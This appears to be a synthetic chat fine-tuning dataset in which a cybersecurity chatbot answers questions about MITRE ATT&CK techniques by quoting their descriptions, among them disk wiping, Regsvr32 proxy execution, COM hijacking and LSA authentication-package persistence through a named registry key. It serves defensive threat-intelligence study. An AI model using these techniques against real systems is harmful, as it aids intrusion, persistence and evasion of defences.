{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disk Content Wipe' and with the Id: T1488 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disk Content Wipe' and with the Id: T1488 is described as follows: Adversaries may erase the contents of storage devices on specific systems as well as large numbers of systems in a network to interrupt availability to system and network resources.Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk erased instead of individual files.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Novetta Blockbuster Destructive Malware). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Subvert Trust Controls' and with the Id: T1553 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Subvert Trust Controls' and with the Id: T1553 is described as follows: Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) . The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Elevated Execution with Prompt' and with the Id: T1548.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Elevated Execution with Prompt' and with the Id: T1548.004 is described as follows: Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.Adversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Firmware' and with the Id: T1592.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Firmware' and with the Id: T1592.003 is described as follows: Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Encrypted Channel' and with the Id: T1573 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Encrypted Channel' and with the Id: T1573 is described as follows: Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Password Filter DLL' and with the Id: T1174 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Password Filter DLL' and with the Id: T1174 is described as follows: Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. (Citation: Carnal Ownage Password Filters Sept 2013). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Authentication Package' and with the Id: T1547.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Authentication Package' and with the Id: T1547.002 is described as follows: Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Regsvr32' and with the Id: T1218.010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Regsvr32' and with the Id: T1218.010 is described as follows: Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Compressed' and with the Id: T1002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Compressed' and with the Id: T1002 is described as follows: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.. The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration to Text Storage Sites' and with the Id: T1567.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration to Text Storage Sites' and with the Id: T1567.003 is described as follows: Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  Text storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credentials in Files' and with the Id: T1081 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credentials in Files' and with the Id: T1081 is described as follows: Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage). The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Software' and with the Id: T1592.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Software' and with the Id: T1592.002 is described as follows: Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Netsh Helper DLL' and with the Id: T1128 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Netsh Helper DLL' and with the Id: T1128 is described as follows: Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.Adversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe. (Citation: Demaske Netsh Persistence)Proof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. (Citation: Github Netsh Helper CS Beacon). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Input Capture' and with the Id: T1056 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Input Capture' and with the Id: T1056 is described as follows: Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Voice' and with the Id: T1566.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Voice' and with the Id: T1566.004 is described as follows: Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Software](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)Adversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing). The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, SaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploits' and with the Id: T1587.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploits' and with the Id: T1587.004 is described as follows: Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Social Media' and with the Id: T1593.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Social Media' and with the Id: T1593.001 is described as follows: Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim\u2019s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Component Object Model Hijacking' and with the Id: T1546.015 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Component Object Model Hijacking' and with the Id: T1546.015 is described as follows: Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credentials' and with the Id: T1589.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credentials' and with the Id: T1589.001 is described as follows: Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.).(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).(Citation: Okta Scatter Swine 2022)Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)). . The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Software Supply Chain' and with the Id: T1195.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Software Supply Chain' and with the Id: T1195.002 is described as follows: Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rename System Utilities' and with the Id: T1036.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rename System Utilities' and with the Id: T1036.003 is described as follows: Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Bidirectional Communication' and with the Id: T1102.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Bidirectional Communication' and with the Id: T1102.002 is described as follows: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation for Client Execution' and with the Id: T1203 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation for Client Execution' and with the Id: T1203 is described as follows: Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.Several types exist:### Browser-based ExploitationWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.### Office ApplicationsCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.### Common Third-party ApplicationsOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.. The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Wordlist Scanning' and with the Id: T1595.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Wordlist Scanning' and with the Id: T1595.003 is described as follows: Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. . The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spoof Security Alerting' and with the Id: T1562.011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spoof Security Alerting' and with the Id: T1562.011 is described as follows: Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.Rather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a \u201chealthy\u201d system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.For example, adversaries may show a fake Windows Security GUI and tray icon with a \u201chealthy\u201d system status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta). The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Outlook Home Page' and with the Id: T1137.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Outlook Home Page' and with the Id: T1137.004 is described as follows: Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)Once malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page). The systems targeted by this attack pattern are: Windows, Office 365 ."}]}
